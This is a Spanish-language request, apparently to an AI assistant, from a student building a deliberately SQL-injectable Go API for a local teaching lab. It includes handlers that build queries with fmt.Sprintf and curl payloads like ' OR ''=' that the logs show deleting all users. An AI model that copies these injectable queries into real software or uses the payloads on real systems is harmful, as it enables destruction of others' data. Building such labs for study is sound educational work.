Despues de ejecutar el payload obtengo este mensaje de error:

root@pho3nix:/home/diegoall/MAESTRIA_ING/anti-pattern-API/anti-pattern-API2# curl -X DELETE "http://localhost:8080/instruments/vulnerable/instruments/a1b2c3d4-e5f6-7890-abcd-1234567890ab%27%20OR%20%27%27%3D%27%27"
No se pudo eliminar el instrumento o no se encontró


Aca estan los logs del contenedor:

root@pho3nix:/home/diegoall/MAESTRIA_ING/anti-pattern-API/anti-pattern-API2# docker ps -a | grep anti-pattern
05ef2e4972a5   anti-pattern-api2_app                           "./main"                 7 seconds ago   Up 7 seconds                0.0.0.0:8080->8080/tcp, :::8080->8080/tcp                                                                  anti-pattern-api2_app_1
a043e66641ac   anti-pattern-api2_db                            "docker-entrypoint.s…"   8 seconds ago   Up 7 seconds                0.0.0.0:5432->5432/tcp, :::5432->5432/tcp                                                                  anti-pattern-api2_db_1
root@pho3nix:/home/diegoall/MAESTRIA_ING/anti-pattern-API/anti-pattern-API2# docker logs -f anti-pattern-api2_app_1
2025/06/19 00:22:29 No se pudo cargar el archivo .env, usando variables del entorno
2025/06/19 00:22:29 Conexión a la base de datos establecida exitosamente.
2025/06/19 00:22:29 Servidor iniciado en http://localhost:8080
Consulta SQL ejecutada (vulnerable): DELETE FROM instruments WHERE id = 'a1b2c3d4-e5f6-7890-abcd-1234567890ab%27%20OR%20%27%27%3D%27%27'


Creo que para que el SQL injection sea explotable debe ser replicado como el ejemplo que suministro ya que ya lo probe y funciona.
Aca esta la referencia:

-  Este es /dma/api/handlers.go

func DeleteUserSQLi(w http.ResponseWriter, r *http.Request) {

	var payload jsonResponse
	id := r.URL.Query().Get("id")

	fmt.Println("El id es:", id)

	app.infoLog.Println(r.URL, id)

	err := app.models.User.DeleteUserSQLi(id)
	if err != nil {
		app.errorLog.Println("Couldn't delete user")
		// send back a response
		payload.Error = true
		payload.Message = "Couldn't delete user"
		return
	}

	// send back a response
	payload.Error = false
	payload.Message = "User deleted correctly"

	err = app.writeJSON(w, http.StatusOK, payload)
	if err != nil {
		app.errorLog.Println(err)
	}
}

- /cmd/api/routes.go
package main

import (
	"net/http"

	"github.com/go-chi/chi"
	"github.com/go-chi/chi/middleware"
	"github.com/go-chi/cors"
)

func (app *application) routes() http.Handler {
	mux := chi.NewRouter()

	mux.Get("/health", app.Health)

	// "For testing purposes, these endpoints are public. They will become private later."
	mux.Delete("/users", app.DeleteUser)
	mux.Delete("/vulnerable/users", app.DeleteUserSQLi)

	// PrivateRoutes
	mux.Route("/admin", func(mux chi.Router) {

	})

	return mux
}

- Aca esta /database/database-models.go
package database

import (
	"context"
	"database/sql"
	"fmt"
	"log"

	"time"
)

const dbTimeout = time.Second * 3

var db *sql.DB

func New(dbPool *sql.DB) Models {
	db = dbPool

	return Models{
		User: User{},
	}
}

type Models struct {
	User User
}

type User struct {
	ID        int       `json:"id"`
	Email     string    `json:"email"`
	FirstName string    `json:"first_name,omitempty"`
	LastName  string    `json:"last_name,omitempty"`
	Password  string    `json:"password"`
	Active    int       `json:"active"`
	CreatedAt time.Time `json:"created_at"`
	UpdatedAt time.Time `json:"updated_at"`
}

func (u *User) DeleteUser(id string) error {

	// Exec uses context.Background internally; to specify the context, use ExecContext.
	// ctx, cancel := context.WithTimeout(context.Background(), dbTimeout)
	// defer cancel()

	stmt := "DELETE FROM users WHERE id = $1"

	//ExecContext es una y Exec es otro
	_, err := db.Exec(stmt, id)
	if err != nil {
		return err
	}

	return nil
}

func (u *User) DeleteUserSQLi(id string) error {
	//ctx, cancel := context.WithTimeout(context.Background(), dbTimeout)
	//defer cancel()

	query := fmt.Sprintf("DELETE FROM users WHERE id = '%s'", id)

	fmt.Println(query)

	if _, err := db.Exec(query); err != nil {
		log.Fatalln("Couldn't delete", err)
	}

	return nil
}

- Aca esta /database/connection.go
package database

import (
	"database/sql"
	"fmt"
	"time"

	_ "github.com/jackc/pgconn"
	_ "github.com/jackc/pgx/v4"
	_ "github.com/jackc/pgx/v4/stdlib"
)

type DB struct {
	SQL *sql.DB
}

var dbConn = &DB{}

const maxOpenDbConn = 5               // Número maximo de conexiones permitidas abiertas
const maxIdleDbConn = 5               // Número maximo de conexiones inactivas (ociosas) abiertas y disponibles para reutilización
const maxDbLifeTime = 5 * time.Minute // tiempo antes de que se considere inactiva una conexión

func ConnectPostgres(dsn string) (*DB, error) {

	db, err := sql.Open("pgx", dsn)
	if err != nil {
		return nil, err
	}

	db.SetMaxOpenConns(maxOpenDbConn)
	db.SetMaxIdleConns(maxIdleDbConn)
	db.SetConnMaxLifetime(maxDbLifeTime)

	err = testDB(db)
	if err != nil {
		return nil, err
	}

	dbConn.SQL = db

	return dbConn, nil
}

func testDB(d *sql.DB) error {
	err := d.Ping()
	if err != nil {
		fmt.Println("Error!", err)
		return err
	}
	fmt.Println("Database ping successful!")
	return nil
}

Aca esta el programa principal /cmd/api/main.go
package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"sql-injection-eafit/database"
)

type config struct {
	port int
}

type application struct {
	config   config
	infoLog  *log.Logger
	errorLog *log.Logger
	models database.Models
}

func main() {

	var cfg config
	cfg.port = 9090

	var dsn string

	infoLog := log.New(os.Stdout, "INFO\t", log.Ldate|log.Ltime)
	errorLog := log.New(os.Stdout, "ERROR\t", log.Ldate|log.Ltime|log.Lshortfile)

	// 1. Hardcoded database credentials in connection string
	// dsn := "host=localhost port=54325 user=postgres password=password dbname=sqli sslmode=disable timezone=UTC connect_timeout=5"

	// 2. Read enviroment variable
	if dsn = os.Getenv("DSN"); dsn == "" {
		fmt.Println("La variable de entorno DSN no está definida.")
	} else {
		fmt.Printf("El valor DSN es: %s\n", dsn)
	}

	db, err := database.ConnectPostgres(dsn)
	if err != nil {
		log.Fatal("Cannot connect to database")
	}
	defer db.SQL.Close()

	app := &application{
		config:   cfg,
		infoLog:  infoLog,
		errorLog: errorLog,
		models: database.New(db.SQL),
	}

	err = app.serve()
	if err != nil {
		log.Fatal(err)
	}

}

func (app *application) serve() error {
	app.infoLog.Println("API listening on port", app.config.port)

	srv := &http.Server{
		Addr:    fmt.Sprintf(":%d", app.config.port),
		Handler: app.routes(),
	}
	return srv.ListenAndServe()
}


- Aca esta la definicion de la base de datos:
DROP TABLE IF EXISTS users;
    
CREATE TABLE
  public.users (
    id serial NOT NULL,
    email character varying (255) NOT NULL,
    first_name character varying (255) NOT NULL,
    last_name character varying (255) NOT NULL,
    address character varying (255) NOT NULL,
    password character varying (60) NOT NULL,
    user_active integer NOT NULL DEFAULT 0,
    created_at timestamp without time zone NOT NULL DEFAULT now(),
    updated_at timestamp without time zone NOT NULL DEFAULT now()
  );


INSERT INTO public.users (email, first_name, last_name, address, password, user_active, created_at, updated_at) 
VALUES 
  ('usuario1@example.com', 'Juan', 'Pérez', 'Calle 123', '$2a$12$IjOgt/06hlNF13IOsrb8veJemUeSDB.7X27UtSubDbjBgXuL.j5ci', 1, now(), now()),
  ('usuario2@example.com', 'María', 'Gómez', 'Avenida 456', '$2a$12$xzfjUjBa06RwrNRu.wb.M.8bWJMc2cI9GZObV9495ypXRbfjNUyPS', 1, now(), now()),
  ('usuario3@example.com', 'Luis', 'Martínez', 'Calle 789', '$2a$12$1HgyDgcSZuZQDkKbEN6elug3P5Z62Rjrrf/YQdDEBiJ3sSuxcqpWW', 1, now(), now()),
  ('usuario4@example.com', 'Ana', 'Rodríguez', 'Avenida 101112', '$2a$12$IjOgt/06hlNF13IOsrb8veJemUeSDB.7X27UtSubDbjBgXuL.j5ci', 1, now(), now()),
  ('usuario5@example.com', 'Pedro', 'López', 'Calle 131415', '$2a$12$xzfjUjBa06RwrNRu.wb.M.8bWJMc2cI9GZObV9495ypXRbfjNUyPS', 1, now(), now());


Esta vulnerabilidad de esta APi se explota con los siguientes payloads:
        curl -X DELETE "http://localhost:9090/vulnerable/users?id=3%27%20OR%20%27%27=%27"  SI FUNCIONO
        curl -X DELETE localhost:9090/vulnerable/users?id=3%27%20OR%20%27%27=%27  SI FUNCIONO

Se puede corroborar:
root@pho3nix:/home/diegoall/Projects/sql-injection-dummy# curl -X DELETE "http://localhost:9090/vulnerable/users?id=3%27%20OR%20%27%27=%27"
{"error":false,"message":"User deleted correctly"}

Con esta consulta se eliminan todos los registros de la base de datos:
sqli=# select * from users;
 id |        email         | first_name | last_name |    address     |                           password                           | user_active |         created_at         |         updated_at         
----+----------------------+------------+-----------+----------------+--------------------------------------------------------------+-------------+----------------------------+----------------------------
  1 | usuario1@example.com | Juan       | Pérez     | Calle 123      | $2a$12$IjOgt/06hlNF13IOsrb8veJemUeSDB.7X27UtSubDbjBgXuL.j5ci |           1 | 2025-06-18 01:24:43.471022 | 2025-06-18 01:24:43.471022
  2 | usuario2@example.com | María      | Gómez     | Avenida 456    | $2a$12$xzfjUjBa06RwrNRu.wb.M.8bWJMc2cI9GZObV9495ypXRbfjNUyPS |           1 | 2025-06-18 01:24:43.471022 | 2025-06-18 01:24:43.471022
  3 | usuario3@example.com | Luis       | Martínez  | Calle 789      | $2a$12$1HgyDgcSZuZQDkKbEN6elug3P5Z62Rjrrf/YQdDEBiJ3sSuxcqpWW |           1 | 2025-06-18 01:24:43.471022 | 2025-06-18 01:24:43.471022
  4 | usuario4@example.com | Ana        | Rodríguez | Avenida 101112 | $2a$12$IjOgt/06hlNF13IOsrb8veJemUeSDB.7X27UtSubDbjBgXuL.j5ci |           1 | 2025-06-18 01:24:43.471022 | 2025-06-18 01:24:43.471022
  5 | usuario5@example.com | Pedro      | López     | Calle 131415   | $2a$12$xzfjUjBa06RwrNRu.wb.M.8bWJMc2cI9GZObV9495ypXRbfjNUyPS |           1 | 2025-06-18 01:24:43.471022 | 2025-06-18 01:24:43.471022
(5 rows)

sqli=# select * from users;
 id | email | first_name | last_name | address | password | user_active | created_at | updated_at 
----+-------+------------+-----------+---------+----------+-------------+------------+------------
(0 rows)

Aca esta la definicion:
sqli=# \d users
                                         Table "public.users"
   Column    |            Type             | Collation | Nullable |              Default              
-------------+-----------------------------+-----------+----------+-----------------------------------
 id          | integer                     |           | not null | nextval('users_id_seq'::regclass)
 email       | character varying(255)      |           | not null | 
 first_name  | character varying(255)      |           | not null | 
 last_name   | character varying(255)      |           | not null | 
 address     | character varying(255)      |           | not null | 
 password    | character varying(60)       |           | not null | 
 user_active | integer                     |           | not null | 0
 created_at  | timestamp without time zone |           | not null | now()
 updated_at  | timestamp without time zone |           | not null | now()

Podrias ayudarme a modificar el handler para la API en al cual estoy reproduciendo el escenario vulnerable y explotable.
En este ejemplo capturan el parametro de esta forma (r.URL.Query().Get("id"))

- Aca esta /handlers/instrument_handler.go
func DeleteInstrumentSQLi(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")

	query := fmt.Sprintf("DELETE FROM instruments WHERE id = '%s'", id) // ¡VULNERABLE!

	fmt.Println("Consulta SQL ejecutada (vulnerable):", query) // Para ver la query inyectada en los logs

	result, err := db.DBConn.ExecContext(context.Background(), query)
	if err != nil { // El error al no encontrar filas se maneja con RowsAffected
		http.Error(w, "Error al eliminar", http.StatusInternalServerError)
		return
	}

	rowsAffected, err := result.RowsAffected()
	if err != nil {
		// Podría indicar un problema al obtener las filas afectadas después de una operación
		http.Error(w, "Error al verificar la eliminación", http.StatusInternalServerError)
		return
	}

	if rowsAffected == 0 {
		// Indica que no se encontró el instrumento o la inyección no eliminó nada
		http.Error(w, "No se pudo eliminar el instrumento o no se encontró", http.StatusNotFound)
		return
	}

	w.WriteHeader(http.StatusNoContent)
}

- Aca esta el programa principal main.go
package main

import (
	"log"
	"net/http"
	"os"

	"github.com/go-chi/chi/v5"
	"github.com/joho/godotenv"

	"instruments-api/db"
	"instruments-api/handlers"
)

func main() {
	err := godotenv.Load()
	if err != nil {
		log.Println("No se pudo cargar el archivo .env, usando variables del entorno")
	}

	db.InitDB()

	r := chi.NewRouter()
	r.Route("/instruments", func(r chi.Router) {

		// URLparam
		r.Get("/", handlers.GetAllInstruments)
		r.Get("/{id}", handlers.GetInstrumentByID)
		r.Post("/", handlers.CreateInstrument)
		r.Put("/{id}", handlers.UpdateInstrument)
		r.Delete("/{id}", handlers.DeleteInstrument)

		// original r.URL.Query().Get("id")  {id}
		// r.Delete("/vulnerable/instruments", handlers.DeleteInstrumentSQLi)

		// URLparam
		r.Delete("/vulnerable/instruments/{id}", handlers.DeleteInstrumentSQLi)

	})

	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}

	log.Printf("Servidor iniciado en http://localhost:%s\n", port)
	http.ListenAndServe(":"+port, r)
}


Podrias modifricar el handler y realizar las modificaciones necesarias en los archivos por completo. Respuesta en español.